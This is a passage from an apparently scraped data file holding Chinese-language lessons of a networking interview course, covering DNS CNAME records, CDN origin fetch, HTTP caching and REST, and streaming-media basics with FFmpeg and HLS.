的设计遵循的依然是人的思考方式。URL 中的 HOST 部分需要被解析为 IP 地址，于是就有了域名系统（DNS）。域名系统是一个分级的分布式系统，整体设计也是一个树状结构。顶层的根域名服务器和中间的顶级域名服务器，存储的是目录，最终的 DNS 记录由权威域名服务器提供。DNS 记录并不仅仅只有映射 IP 一种能力，DNS 记录还可以设置网站的别名、邮件服务器、DNS 记录位置等能力。</p>\n<p data-nodeid="1178"><strong data-nodeid="1339">那么，通过这一讲的学习，你可以尝试来回答本讲关联的面试题目：CNAME 记录的作用是？</strong></p>\n<p data-nodeid="1179">【<strong data-nodeid="1345">解析</strong>】CNAME 是一种 DNS 记录，它的作用是将一个域名映射到另一个域名。域名解析的时候，如果看到 CNAME 记录，则会从映射目标重新开始查询。</p>\n<h3 data-nodeid="1180">思考题</h3>\n<p data-nodeid="1181">最后我再给你出一道需要查资料的思考题：DNS 工作在互联网协议群的哪一层？</p>\n<p data-nodeid="1182" class="">这一讲就到这里，发现求知的乐趣，我是林䭽。感谢你学习本次课程，下一讲我们将学习《15 | 内容分发网络 ：请简述 CDN 回源如何工作？》，再见！</p>',
        article_title: "14 | DNS 域名解析系统：CNAME 记录的作用是？",
        title: "14 | DNS 域名解析系统：CNAME 记录的作用是？",
        id: 7281,
      },
      {
        content:
          '<p data-nodeid="605" class="">今天使用的电商、直播、社交工具、视频网站中都含有大量的图片、视频、文档等，这些资源需要分发给用户。对于一些体量较大的应用来说，如果把大量资源集中到单一节点进行分发，恐怕很难有某个机房可以支撑得住这么大的流量。例如一个日活在 100W 的小型互联网产品，如果每次请求需要 1M 的数据，那就刚好是近 1TB 数据。对于这样的数据规模而言，完全由单一节点进行分发是不现实的。因此现在互联网应用在分发内容的时候，并不是从自己架设的服务器上直分发内容，而是走一个叫作<strong data-nodeid="646">内容分发网络</strong>（Content Dilivery Network）的互联网底层建设。</p>\n<p data-nodeid="606">这一讲，我们就以“<strong data-nodeid="652">CDN 回源是如何工作的</strong>”为引，开启今天的学习，和你一起探索 CDN 的原理和场景。</p>\n<h3 data-nodeid="607">CDN 是什么?</h3>\n<p data-nodeid="608"><strong data-nodeid="662">和域名系统类似，内容分发网络（Content Dilivery Network，CDN）是一个专门用来分发内容的分布式应用</strong>。CDN 构建在现有的互联网之上，通过在各地部署数据中心，让不同地域的用户可以就近获取内容。这里的内容通常指的是文件、图片、视频、声音、应用程序安装包等，它们具有一个显著的特征——<strong data-nodeid="663">无状态，或者说是静态的</strong>。这些资源不像订单数据、库存数据等，它们一旦发布，就很少会发生变化。另一个显著的特征，是这些资源往往会被大量的用户需要，因此分发它们的流量成本是较高的。</p>\n<p data-nodeid="609"><strong data-nodeid="668">为什么不能集中提供这些静态资源呢</strong>？这和域名系统的 DNS 记录不能集中提供是一个道理，需要考虑到流量、单点故障、延迟等因素。在离用户更近的地理位置提供资源，可以减少延迟。按照地理位置分散地提供资源，也可以降低中心化带来的服务压力。</p>\n<p data-nodeid="610">因此，CDN 的服务商会选择在全球布点，或者在某个国家布点。具体要看 CDN 服务提供商的服务范围。目前国内的阿里云、腾讯云等也在提供 CDN 业务。</p>\n<h3 data-nodeid="611">内容的分发</h3>\n<p data-nodeid="612">CDN 是一个分布式的内容分发网络。当用户请求一个网络资源时，用户请求的是 CDN 提供的资源。和域名系统类似，当用户请求一个资源时，首先会接触到一个类似域名系统中目录的服务，这个服务会告诉用户究竟去哪个 IP 获取这个资源。</p>\n<p data-nodeid="613"><strong data-nodeid="682">事实上，很多大型的应用，会把 DNS 解析作为一种负载均衡的手段</strong>。当用户请求一个网址的时候，会从该网站提供的智能 DNS 中获取网站的 IP。例如当你请求拉勾的时候，具体连接到哪个拉勾的 IP，是由拉勾使用的智能 DNS 服务决定的。域名系统允许网站自己为自己的产品提供 DNS 解析，具体可以参考<a href="https://kaiwu.lagou.com/course/courseInfo.htm?courseId=837#/detail/pc?id=7281&amp;fileGuid=xxQTRXtVcqtHK6j8" data-nodeid="680">《14 | DNS 域名解析系统：CNAME 记录的作用是？》</a>介绍的 ns 记录。</p>\n<p data-nodeid="614">所以总体静态资源的使用路径如下图所示：</p>\n<p data-nodeid="756" class="te-preview-highlight"><img src="https://s0.lgstatic.com/i/image6/M00/41/EE/CioPOWCvAPCAKWMAAAM_tmZAhpc658.png" alt="图片1.png" data-nodeid="759"></p>\n\n<p data-nodeid="616">当用户请求一个静态资源的时候，首先会触发域名系统的解析。域名系统会将解析的责任交由 CDN 提供商来处理，CDN 的智能 DNS 服务会帮助用户选择离自己距离最近的节点，返回这个节点的 A（或 AAAA）记录。然后客户端会向 CDN 的资源节点发起请求，最终获得资源。</p>\n<p data-nodeid="617">在上面整个过程当中，CDN 的智能 DNS 还充当了负载均衡的作用。如果一个节点压力过大，则可以将流量导向其他的节点。</p>\n<h3 data-nodeid="618">回源</h3>\n<p data-nodeid="619">目前我们已经讨论了 CDN 的主要设计和架构，但是还有一个问题没有解决——就是资源怎么进入内容分发网络。资源的生产者，也是 CDN 的购买者，目的是向用户提供网络服务。那么服务提供者的静态资源如何进入 CDN 呢？ 手动上传、用接口推送，还是通过其他别的方式呢？</p>\n<p data-nodeid="620">你可以把 CDN 想象成一个分布式的分级缓存，再加上数据库的两层设计，如下图所示：</p>\n<p data-nodeid="621"><img src="https://s0.lgstatic.com/i/image6/M00/41/91/CioPOWCsuKeAIBZBAAGS1a5eHTk676.png" alt="Drawing 3.png" data-nodeid="694"></p>\n<p data-nodeid="622">用户的请求先到达缓存层，如果缓存被穿透，才到达最终的存储层。缓存的设计必须是分布式的，因为绝大多数的资源使用都会发生在缓存上，只有极少数的请求才会穿透到底层的存储。通常这种设计，我们期望缓存层至少需要帮挡住 99% 的流量。既然缓存层能挡住 99% 的流量，那么实际的数据存储就可以交由源站点完成。</p>\n<p data-nodeid="623">值得一提的是，在程序设计当中有一个核心的原则，叫作<strong data-nodeid="705">单一数据源（Single Souce of Truth， SSOT）</strong>。<strong data-nodeid="706">这个原则指的是，在程序设计中，应该尽可能地减少数据的来源，最好每个数据来源只有单独一份</strong>。这样能够避免大量的数据不一致以及同步数据的问题。基于这样的设计，谁来提供资源的存储呢？谁来提供这个单一的数据源呢？当然是服务提供者本身。如果 CDN 再提供 一份资源的存储，不就有两个数据源了吗？而且，只有服务的提供者才能更好地维护这个资源仓库。</p>\n<p data-nodeid="624">在 CDN 的设计当中，CDN 实际上提供的是数据的缓存。而原始数据，则由服务的提供者提供。举个例子，当用户请求一张拉勾网上的图片，看上去这张图片的网址就是拉勾的一个网址：<a href="http://s0.lgstatic.com?fileGuid=xxQTRXtVcqtHK6j8" data-nodeid="710">s0.lgstatic.com</a>。而实际上，如果你用 DIG 命令去查看这个网址，会看到如下图所示的结果：</p>\n<p data-nodeid="625"><img src="https://s0.lgstatic.com/i/image6/M01/41/89/Cgp9HWCsuK6AFxN_AAUoFziC3xU348.png" alt="Drawing 4.png" data-nodeid="714"></p>\n<p data-nodeid="626">上面的结果中，拉勾网的静态资源域名<a href="http://s0.lgstatic.com/?fileGuid=xxQTRXtVcqtHK6j8" data-nodeid="718">s0.lgstatic.com</a>被 CNAME 到了<a href="http://s0.lgstatic.com.wswebpic.com%E3%80%82%E8%BF%99%E8%AF%B4%E6%98%8E%E5%BD%93%E7%94%A8%E6%88%B7%E5%9C%A8%E8%AF%B7%E6%B1%82s0.lgstatic.com%EF%BC%88%E4%B8%80%E4%B8%AA%E6%8B%89%E5%8B%BE%E5%9F%9F%E5%90%8D%EF%BC%89%E7%9A%84%E8%B5%84%E6%BA%90%E6%97%B6%EF%BC%8C%E5%AE%9E%E9%99%85%E8%AF%B7%E6%B1%82%E7%9A%84CDN%E6%9C%8D%E5%8A%A1%E6%8F%90%E4%BE%9B%E5%95%86%E7%9A%84%E5%9F%9F%E5%90%8D%E3%80%82?fileGuid=xxQTRXtVcqtHK6j8" data-nodeid="722">s0.lgstatic.com.wswebpic.com</a>。这说明当用户在请求 s0.lgstatic.com（一个拉勾域名）的资源时，实际请求的 CDN 服务提供商的域名。当用户向 CDN 请求资源的时候，CDN 的智能 DNS 服务就会帮助用户选最优的节点（比如地理上最临近的，或者当前较空闲的）。如果 CDN 资源节点中已经存在了用户拥有的资源，那么就直接返回资源给用户。如果 CDN 中尚未缓存这个资源， 此时 CDN 节点就会向拉勾请求资源。也就是说，拉勾网需要有所有的原始数据，并提供出来可以让 CDN 服务访问。</p>\n<p data-nodeid="627">如下图所示，整个过程是 4 个层级。用户请求静态资源通常用自己的域名（防止跨域和一些安全问题）。为了让用户请求的是自己的网站，而使用的是 CDN 的服务，这里会使用 CNAME 让自己的域名作为 CDN 域名的一个别名。当请求到 CDN 服务的时候，会首先由 CDN 的 DNS 服务帮助用户选择一个最优的节点，这个 DNS 服务还充当了负载均衡的作用。接下来，用户开始向 CDN 节点请求资源。如果这个时候资源已经过期或者还没有在 CDN 节点上，就会从源站读取数据，这个步骤称为<strong data-nodeid="729">CDN 的回源</strong>。</p>\n<p data-nodeid="628"><img src="https://s0.lgstatic.com/i/image6/M01/41/89/Cgp9HWCsuLeABoBAAAJfmJcMOc0952.png" alt="Drawing 6.png" data-nodeid="732"></p>\n<p data-nodeid="629">另一方面，CDN 上缓存的资源通常也会伴随失效时间的设置，当失效之后同样会触发回源。另一种情况是可以通过开放的 API 或者 CDN 管理后台直接删除缓存（让资源失效），这个操作结束后，同样会触发回源。</p>\n<h3 data-nodeid="630">总结</h3>\n<p data-nodeid="631">总结一下，CDN 是一种网络应用，作用是分发互联网上的资源。CDN 服务的提供商，会在世界（或国家）范围内设立数据中心，帮助分发资源。用户请求的资源会被 CDN 分发到最临近的节点获取。</p>\n<p data-nodeid="632">CDN 作为一门生意，CDN 的服务商会大批量的从运营商处获取流量，然后再以较高但是可以接受的价格卖给服务提供方。对于中小型互联网公司来说，购买一定的 CDN 流量成本可控，比如 1G 流量在 1 元以内。对于大型的互联网公司，特别是对 CDN 依赖严重的公司，可能还需要自己建设。比如 2021 年抖音每天分发的数据量在 50PB 左右（1PB=1024TB），如此庞大的数据量如果换算成钱是非常高的。按照阿里云的报价，50PB 的价格是 480W 人民币。按照这种体量计算，抖音每天要花 480W 人民币，一年是 17 亿。</p>\n<p data-nodeid="633">所以当你设计一个内容分发的方案时，除了要考虑到其中的技术细节，也要从成本上进行思考，看看能不能从数据压缩、资源格式角度做一些文章。之前我参与的一个项目就考虑将图片从 jpg 格式替换为 webp 格式，一年节省了 500W 元的 CDN 费用。</p>\n<p data-nodeid="634"><strong data-nodeid="742">那么现在你可以尝试来回答本讲关联的面试题目：请简述 CDN 回源是如何工作的</strong>？</p>\n<p data-nodeid="635">【<strong data-nodeid="748">解析</strong>】CDN 回源就是 CDN 节点到源站请求资源，重新设置缓存。通常服务提供方在使用 CDN 的时候，会在自己的某个域名发布静态资源，然后将这个域名交给 CDN。</p>\n<p data-nodeid="636">比如源站在 s.example.com 中发布静态资源，然后在 CDN 管理后台配置了这个源站。在使用 CDN 时，服务提供方会使用另一个域名，比如说 b.example.com。然后配置将 b.example.com 用 CNAME 记录指向 CDN 的智能 DNS。这个时候，如果用户下载b.example.com/a.jpg，CDN 的智能 DNS 会帮用户选择一个最优的 IP 地址（最优的 CDN 节点）响应这次资源的请求。如果这个 CDN 节点没有 a.jpg，CDN 就会到 s.example.com 源站去下载，缓存到 CDN 节点，然后再返回给用户。</p>\n<p data-nodeid="637">CDN 回源有 3 种情况，一种是 CDN 节点没有对应资源时主动到源站获取资源；另一种是缓存失效后，CDN 节点到源站获取资源；还有一种情况是在 CDN 管理后台或者使用开放接口主动刷新触发回源。</p>\n<h3 data-nodeid="638">思考题</h3>\n<p data-nodeid="639">最后再给你出一道需要查资料的思考题：如果你的应用需要智能 DNS 服务，你将如何实现？</p>\n<p data-nodeid="640" class="">这一讲就到这里，发现求知的乐趣，我是林䭽。感谢你学习本次课程，下一讲我们将学习《16 | HTTP 协议面试通关 ：强制缓存和协商缓存的区别是？》，再见！</p>',
        article_title: "15 | 内容分发网络：请简述 CDN 回源如何工作？",
        title: "15 | 内容分发网络：请简述 CDN 回源如何工作？",
        id: 7282,
      },
      {
        content:
          '<p data-nodeid="3">超文本传输协议（HyperText Transfer Protocol，HTTP）是目前使用最广泛的应用层协议。在网站、App、开放接口中都可以看到它。HTTP 协议设计非常简单，但是涵盖的内容很多。相信你平时工作中已经多多少少接触过这个协议，这一讲我们会挑选其中一部分重点介绍，比如高频面试内容，以及容易产生理解误区的内容，帮助你深入学习 HTTP 协议。</p>\n<h3 data-nodeid="4">WWW</h3>\n<p data-nodeid="5">1990 年蒂姆·伯纳斯·李开发了第一个浏览器，书写了第一个 Web 服务器程序和第一张网页。网页用的语言后来被称作<strong data-nodeid="70">超文本标记语言（HTML）</strong>，而在服务器和客户端之间传输网页的时候，伯纳斯·李没有直接使用传输层协议，而是在 TCP 的基础上构造了一个应用层协议，这个就是<strong data-nodeid="71">超文本传输协议 HTTP</strong>。</p>\n<p data-nodeid="6">万维网（World Wide Web， WWW）是伯纳斯·李对这一系列发明，包括 Web 服务、HTTP 协议、HTML 语言等一个体系的综合。</p>\n<h3 data-nodeid="7">请求响应和长连接</h3>\n<p data-nodeid="8">HTTP 协议采用请求/返回模型。客户端（通常是浏览器）发起 HTTP 请求，然后 Web 服务端收到请求后将数据回传。</p>\n<p data-nodeid="9">HTTP 的请求和响应都是文本，你可以简单认为 HTTP 协议利用 TCP 协议传输文本。当用户想要看一张网页的时候，就发送一个文本请求到 Web 服务器，Web 服务器解析了这段文本，然后给浏览器将网页回传。</p>\n<p data-nodeid="10"><strong data-nodeid="80">那么这里有一个问题，是不是每次发送一个请求，都建立一个 TCP 连接呢</strong>？ 当然不能这样，为了节省握手、挥手的时间。当浏览器发送一个请求到 Web 服务器的时候，Web 服务器内部就设置一个定时器。在一定范围的时间内，如果客户端继续发送请求，那么服务器就会重置定时器。如果在一定范围的时间内，服务器没有收到请求，就会将连接断开。这样既防止浪费握手、挥手的资源，同时又避免一个连接占用时间过长无法回收导致内存使用效率下降。</p>\n<p data-nodeid="11">这个能力可以利用 HTTP 协议头进行配置，比如下面这条请求头：</p>\n<pre class="lang-java" data-nodeid="12"><code data-language="java">Keep-Alive: timeout=<span class="hljs-number">5</span>s\n</code></pre>\n<p data-nodeid="13">会告诉 Web 服务器连接的持续时间是 5s，如果 5s 内没有请求，那么连接就会断开。</p>\n<h3 data-nodeid="14">HTTP 2.0 的多路复用</h3>\n<p data-nodeid="15">Keep-Alive 并不是伯纳斯·李设计 HTTP 协议时就有的能力。伯纳斯·李设计的第一版 HTTP 协议是 0.9 版，后来随着协议逐渐完善，有了 1.0 版。而 Keep-Alive 是 HTTP 1.1 版增加的功能，目的是应对越来越复杂的网页资源加载。从 HTTP 协议诞生以来，网页中需要的资源越来越丰富，打开一张页面需要发送的请求越来越多，于是就产生了 Keep-Alive 的设计。</p>\n<p data-nodeid="16">同样，当一个网站需要加载的资源较多时，浏览器会尝试并发发送请求（利用多线程技术）。浏览器会限制同时发送并发请求的数量，通常是 6 个，这样做一方面是对用户本地体验的一种保护，防止浏览器抢占太多网络资源；另一方面也是对站点服务的保护，防止瞬时流量过大。</p>\n<p data-nodeid="17">在 HTTP 2.0 之后，增加了多路复用能力。和之前我们讲 RPC 框架时提到的多路复用类似，请求、返回会被拆分成切片，然后混合传输。这样请求、返回之间就不会阻塞。你可以思考，对于一个 TCP 连接，在 HTTP 1.1 的 Keep-Alive 设计中，第二个请求，必须等待第一个请求返回。如果第一个请求阻塞了，那么后续所有的请求都会阻塞。而 HTTP 2.0 的多路复用，将请求返回都切分成小片，这样利用同一个连接，请求相当于并行的发出，互相之间不会有干扰。</p>\n<h3 data-nodeid="18">HTTP 方法和 RestFul 架构</h3>\n<p data-nodeid="19">伴随着 HTTP 发展，也诞生了一些著名的架构，比如 RestFul。在面试中，经常会遇到 RestFul，RestFul 是 3 个单词的合并缩写：</p>\n<ul data-nodeid="20">\n<li data-nodeid="21">\n<p data-nodeid="22">Re（Representational）</p>\n</li>\n<li data-nodeid="23">\n<p data-nodeid="24">st（State）</p>\n</li>\n<li data-nodeid="25">\n<p data-nodeid="26">Ful（Transfer）</p>\n</li>\n</ul>\n<p data-nodeid="27">这个命名非常有趣，让我联想到 grep 命令的命名，global regular pattern match。这是一种非常高端的命名技巧，提取词汇中的一个部分组合成为一个读起来朗朗上口的新词汇，建议你在实战命名的时候也可以考虑试试。</p>\n<p data-nodeid="28"><strong data-nodeid="97">在 RestFul 架构中，状态仅仅存在于服务端，前端无状态</strong>。状态（State）可以理解为业务的状态，这个状态是由服务端管理的。这个无状态和服务端目前倡导的无状态设计不冲突，现在服务端倡导的无状态设计指的是容器内的服务没有状态，状态全部存到合适的存储中去。所以 Restful 中的 State，是服务端状态。</p>\n<p data-nodeid="29"><strong data-nodeid="102">前端（浏览器、应用等）没有业务状态，却又要展示内容，因此前端拥有的是状态的表示，也就是 Representation</strong>。比如一个订单，状态存在服务端（数据库中），前端展示订单只需要部分信息，不需要全部信息。前端只需要展示数据，展示数据需要服务端提供。所以服务端提供的不是状态，而是状态的表示。</p>\n<p data-nodeid="30">前端没有状态，当用户想要改变订单状态的时候，比如支付，这个时候前端就向服务端提交表单，然后服务端触发状态的变化。这个过程我们称为<strong data-nodeid="108">转化（Transfer）</strong>。从这个角度来看，Restful 讲的是一套前端无状态、服务端管理状态，中间设计转化途径（请求、函数等）的架构方法。这个方法可以让前后端职责清晰，前端负责渲染， 服务端负责业务。前端不需要业务状态，只需要展示。服务端除了关心状态，还要提供状态的转换接口。</p>\n<h4 data-nodeid="31">HTTP 方法</h4>\n<p data-nodeid="32">在 Restful 架构中，除了约定了上述整体架构方案之外，还约束了一些实现细节，比如用名词性的接口和 HTTP 方法来设计服务端提供的接口。</p>\n<p data-nodeid="33">我们用 GET 获取数据，或者进行查询。比如下面这个例子，就是在获取 id 为 123 的订单数据：</p>\n<pre class="lang-java" data-nodeid="34"><code data-language="java">GET /order/<span class="hljs-number">123</span>\n</code></pre>\n<p data-nodeid="35">GET 是 HTTP 方法，/order 是一种名词性质的命名。这样设计语义非常清晰，这个接口是获取订单的数据（也就是订单的 Representation 用的）。</p>\n<p data-nodeid="36">对于更新数据的场景，按照 HTTP 协议的约定，PUT 是一种幂等的更新行为，POST 是一种非幂等的更新行为。举个例子：</p>\n<pre class="lang-java" data-nodeid="37"><code data-language="java">PUT /order/<span class="hljs-number">123</span> \n{...订单数据}\n</code></pre>\n<p data-nodeid="38">上面我们用 PUT 更新订单，如果订单 123 还没有创建，那么这个接口会创建订单。如果 123 已经存在，那么这个接口会更新订单 123 的数据。为什么是这样？因为 PUT 代表幂等，对于一个幂等的接口，请求多少遍最终的状态是一致的，也就是说操作的都是同一笔订单。</p>\n<p data-nodeid="39">如果换成用 POST 更新订单：</p>\n<pre class="lang-java" data-nodeid="40"><code data-language="java">POST /order\n{...订单数据}\n</code></pre>\n<p data-nodeid="41">POST 代表非幂等的设计，像上面这种用 POST 提交表单的接口，调用多次往往会产生多个订单。也就是非幂等的设计每次调用结束后都会产生新的状态。</p>\n<p data-nodeid="42">另外在 HTTP 协议中，还约定了 DELETE 方法用于删除数据。其实还有几个方法，感兴趣的同学可以查询下，比如 OPTIONS、PATCH，然后我们在留言区中讨论。</p>\n<h3 data-nodeid="43">缓存</h3>\n<p data-nodeid="44">在 HTTP 的使用中，我们经常会遇到两种缓存，<strong data-nodeid="124">强制缓存和协商缓存</strong>，接下来我举两个场景来说明。</p>\n<h4 data-nodeid="45">强制缓存</h4>\n<p data-nodeid="46">你的公司用版本号管理某个对外提供的 JS 文件。比如说 libgo.1.2.3.js，就是 libgo 的 1.2.3 版本。其中 1 是主版本，2 是副版本，3 是补丁编号。每次你们有任何改动，都会更新 libgo 版本号。在这种情况下，当浏览器请求了一次 libgo.1.2.3.js 文件之后，还需要再请求一次吗？</p>\n<p data-nodeid="47">整理下我们的需求，浏览器在第一次进行了<code data-backticks="1" data-nodeid="128">GET /libgo.1.2.3.js</code>这个操作后，如果后续某个网页还用到了这个文件（libgo.1.2.3.js），我们不再发送第二次请求。这个方案要求浏览器将文件缓存到本地，并且设置这个文件的失效时间（或者永久有效）。这种请求过一次不需要再次发送请求的缓存模式，在 HTTP 协议中称为<strong data-nodeid="134">强制缓存</strong>。当一个文件被强制缓存后，下一次请求会直接使用本地版本，而不会真的发出去。</p>\n<p data-nodeid="48"><strong data-nodeid="139">使用强制缓存时要注意，千万别把需要动态更新的数据强制缓存</strong>。一个负面例子就是小明把获取用户信息数据的接口设置为强制缓存，导致用户更新了自己的信息后，一直要等到强制缓存失效才能看到这次更新。</p>\n<h4 data-nodeid="49">协商缓存</h4>\n<p data-nodeid="50">我们再说一个场景：小明开发了一个接口，这个接口提供全国省市区的 3 级信息。先问你一个问题，这个场景可以用强制缓存吗？小明一开始觉得强制缓存可以，然后突然有一天接到运营的通知，某市下属的两个县合并了，需要调整接口数据。小明错手不急，更新了接口数据，但是数据要等到强制缓存失效。</p>\n<p data-nodeid="51">为了应对这种场景，HTTP 协议还设计了<strong data-nodeid="147">协商缓存</strong>。协商缓存启用后，第一次获取接口数据，会将数据缓存到本地，并存储下数据的摘要。第二次请求时，浏览器检查到本地有缓存，将摘要发送给服务端。服务端会检查服务端数据的摘要和浏览器发送来的是否一致。如果不一致，说明服务端数据发生了更新，服务端会回传全部数据。如果一致，说明数据没有更新，服务端不需要回传数据。</p>\n<p data-nodeid="52">从这个角度看，协商缓存的方式节省了流量。对于小明开发的这个接口，多数情况下协商缓存会生效。当小明更新了数据后，协商缓存失效，客户端数据可以马上更新。<strong data-nodeid="153">和强制缓存相比，协商缓存的代价是需要多发一次请求</strong>。</p>\n<h3 data-nodeid="53">总结</h3>\n<p data-nodeid="54">这一讲我们讨论了 HTTP 协议中的一些面试难点和理解误区。目前 HTTP 协议已经发展到了 2.0 版本，不少网站都更新到了 HTTP 2.0。大部分浏览器、CDN 也支持了 HTTP 2.0。如果你感兴趣可以自行查阅更多关于 HTTP 2.0 解决队头阻塞、HPack 压缩算法、Server Push 等资料。</p>\n<p data-nodeid="55">另外 HTTP 3.0 协议也在建设当中，HTTP 3.0 对 HTTP 2.0 兼容，主要调整发生在网络底层。HTTP 3.0 开始采用 UDP 协议，并在 UDP 协议之上，根据 HTTP 协议的需求特性，研发了网络层、应用层去解决可靠性等问题。</p>\n<p data-nodeid="56">这一讲就到这里，发现求知的乐趣，我是林䭽。感谢你学习本次课程，下一讲我们将学习《17 | 流媒体技术：直播网站是如何实现的？》，再见！</p>',
        article_title: "16 | HTTP 协议面试通关：强制缓存和协商缓存的区别是？",
        title: "16 | HTTP 协议面试通关：强制缓存和协商缓存的区别是？",
        id: 7283,
      },
      {
        content:
          '<p data-nodeid="629" class="">现在的年轻人基本都爱刷 B 站和抖音，空闲时间还喜欢去拉勾教育看看大厂面试、热门技术分享直播，以及各类游戏直播。不知道你有没有思考过，我们每天看到的这么多音视频内容，是如何从采集端，最终呈现到我们的手机 App 上的？如果公司要提供直播服务，那么你可以出技术方案吗？为了应对这些应用场景，这一讲我们就以“<strong data-nodeid="694">直播网站是如何实现的</strong>”，来系统聊聊直播、点播、视频网站等基于流媒体技术的应用是怎么回事。</p>\n<h3 data-nodeid="630">流媒体</h3>\n<p data-nodeid="631">在流媒体技术不发达的时代，数据往往是以单个文件的形式存在的。比如说十多年前人们要从互联网上看一部电影，他就需要把这个电影文件下载到本地来看。当时十多 k 每秒的网速，要想下载一个电影，往往需要花费一整个晚上。</p>\n<p data-nodeid="632"><strong data-nodeid="701">今天我们将所有的数据都抽象成了流</strong>，文件的格式也发生了变化。那么如何将一个视频抽象成流呢？其实就是传输一部分即可播放一部分。在实际的操作当中，我们设计了一种类似目录的格式，将音视频数据进行切片，这部分能力利用现有的工具 FFmpeg 就可以轻松做到。在你的机器上装一个 FFmpeg，然后利用这条指令处理一个 MP4 文件，就可以生成很多切片和一个目录文件。</p>\n<pre class="lang-java" data-nodeid="633"><code data-language="java">ffmpeg -i input.mp4 -c:v libx264 -c:a aac -strict -<span class="hljs-number">2</span> -f hls output.m3u8\n</code></pre>\n<p data-nodeid="634">上面将<code data-backticks="1" data-nodeid="703">input.mp4</code>切割成HTTP Live Streaming 可以播放的切片（大多数浏览器中的播放器都可以播放）。最终会生成大量的切片文件，比如说每个 256k，以及一个目录文件 output.m3u8。</p>\n<p data-nodeid="635">下图展示的是用 FFmpeg 在我的机器上对 input.mp4 操作生成的文件清单：</p>\n<p data-nodeid="636"><img src="https://s0.lgstatic.com/i/image6/M00/42/3F/Cgp9HWCwvG2AcnETAAFSLi8vEPQ187.png" alt="Drawing 0.png" data-nodeid="708"></p>\n<p data-nodeid="637">m3u8 文件是目录，它记录了每个视频切片文件（ts）对应的视频时间范围。用户播放视频的时候，会先下载 m3u8 文件。当用户调整视频播放滑块选择播放时间时，播放器就根据 m3u8 的内容下载对应的 ts 文件。</p>\n<h3 data-nodeid="638">基于流媒体的架构</h3>\n<p data-nodeid="639">了解了上面最基本的原理，我们来思考一个基础架构。如下图所示：</p>\n<p data-nodeid="640"><img src="https://s0.lgstatic.com/i/image6/M00/42/47/CioPOWCwvHWANpVdAAHIMSCrf0Q376.png" alt="Drawing 2.png" data-nodeid="714"></p>\n<p data-nodeid="641">视频录制完成后，可能是 MP4 等格式。首先，我们将视频上传到服务器进行编码，产生上面提到的切片文件。切片文件存储到流媒体服务器中，当用户需要的时候，就从流媒体服务器中读取视频目录（上面的 m3u8 文件），然后在各个端播放。进行编码的时候，可以根据不同的清晰度编码多个版本，来应对用户在不同网络环境的情况。</p>\n<h4 data-nodeid="642">直播</h4>\n<p data-nodeid="643">从这个角度出发去思考，直播技术仍然可以复用上面的这套架构。录制端不断上传视频内容，视频内容编码后流媒体服务器负责分发。如果观看人数较多，可以使用 CDN 回源到流媒体服务器。对于直播，m3u8 文件可以看作一个动态的文件，能够不断产生新的数据。因此直播技术中，可以考虑将获取 m3u8 文件设计成一个接口，不断由播放器请求新的 m3u8 文件。</p>\n<h4 data-nodeid="644">其他音视频网站</h4>\n<p data-nodeid="645">对于其他音视频网站架构也是类似的，将视频编码后（含切片）然后利用 CDN 分发目录和切片文件，就可以播放了。</p>\n<h3 data-nodeid="646">视频的编码和解码</h3>\n<p data-nodeid="647">因为通常视频文件较大，因此在传输前通常需要压缩。另外，在播放前还需要解码。视频的压缩技术并非普通的文件压缩技术，而是针对视频的特征进行特别处理的压缩技术。</p>\n<p data-nodeid="648">你可以将流畅的视频理解成连续播放的图片，这也是视频呈现的原理，主要依靠的是人类视觉的残留效应。视频的压缩算法也是如此，本质上是对图片的压缩。因为视频的前一个画面和后一个画面衔接紧密，如果把它们看作两张图片，这两张图片中往往只有部分内容发生了变化。另外，在连续的多张图片中，也会有重复出现的事物，比如说一座桥、一间教室都可能多次出现。因此，视频压缩可以根据这些特性进行抽象。</p>\n<p data-nodeid="649">对视频进行压缩的时候，视频文件格式也和压缩算法息息相关，我们统称为视频的编码。视频需要编码，包括如何描述目录、如何描述切片、如何存储声音，这些都是编码要考虑的。一个完整的解决方案，我们称为一套视频的编码。比如说 H264 就是国际标准化组织在推广的一种编码格式。当然，所有特性的核心是在减少视频体积（网络传输）的基础上，尽可能地提供更高的画质；另一方面就是要尽可能减少中间编码/解码的时间成本（机器资源）。</p>\n<h4 data-nodeid="650">宏块</h4>\n<p data-nodeid="651">这里顺带提一个非常重要的概念，就是<strong data-nodeid="730">宏块</strong>。</p>\n<p data-nodeid="652">在包括 H264 的很多视频编码技术中，都有一个叫作宏块的概念。宏块，就是将画面分成大小不等的区域。比如说 8x8、16x16 等。</p>\n<p data-nodeid="653">当播放两个连续的画面的时候，你可以理解成两张图片。但是如果基于图片分析，那么播放的就是很多个宏块。在这连续的两帧画面中，并不是所有的宏块都发生了变化。特别是当你看一些教学 PPT 的讲稿时，视频前后两帧的宏块基本没有发生变化。因此往往相同画质、相同时长的教学视频体积会远小于电影视频的体积。</p>\n<p data-nodeid="654">具体的压缩算法不在本次课程的涵盖范围之内，如果你感兴趣可以自己去查资料了解一下，参考分组、帧、预测帧等概念。</p>\n<h3 data-nodeid="655">点到点视频技术</h3>\n<p data-nodeid="656">接下来我们讨论下点到点视频技术。</p>\n<p data-nodeid="657">在视频会议、面对面聊天等场景下，我们还需点到点的视频技术。理论上说，这个时候可以复用之前提到的架构。</p>\n<p data-nodeid="658"><img src="https://s0.lgstatic.com/i/image6/M00/42/3F/Cgp9HWCwvICAD29DAAEi0JOkn3I490.png" alt="Drawing 4.png" data-nodeid="739"></p>\n<p data-nodeid="659">一个客户端将自己本地录制的视频用二进制上传，在服务端编码然后分发到另一个端。数据在另一个端解码并播放。</p>\n<p data-nodeid="660">这样做的缺点是链路较长，于是在实际操作的过程中如果是 1 对 1 的视频聊天，可以考虑实现点到点的服务。</p>\n<p data-nodeid="661"><img src="https://s0.lgstatic.com/i/image6/M00/42/47/CioPOWCwvIeAdFE6AADhguAHIg4587.png" alt="Drawing 6.png" data-nodeid="744"></p>\n<p data-nodeid="662">不过事情并没有那么简单，因为不同的主机可能在不同的私有网络。比如 Host1 在拉勾的办公室，Host2 是某位拉勾的合作伙伴。如下图所示：</p>\n<p data-nodeid="663"><img src="https://s0.lgstatic.com/i/image6/M01/42/47/CioPOWCwvJuAYQHBAALc0IDGGso302.png" alt="Drawing 8.png" data-nodeid="748"></p>\n<p data-nodeid="664">你会发现如整个设计中需要一个 NAT 路由器，这样客户的数据才能回传到拉勾内网的机器。而实际情况并没有这么简单，在 NAT 通信中，往往需要在内网的主机发起连接。这个时候 NAT 模块识别发起的端口并记录。换句话说，如果某客户的机器是公网 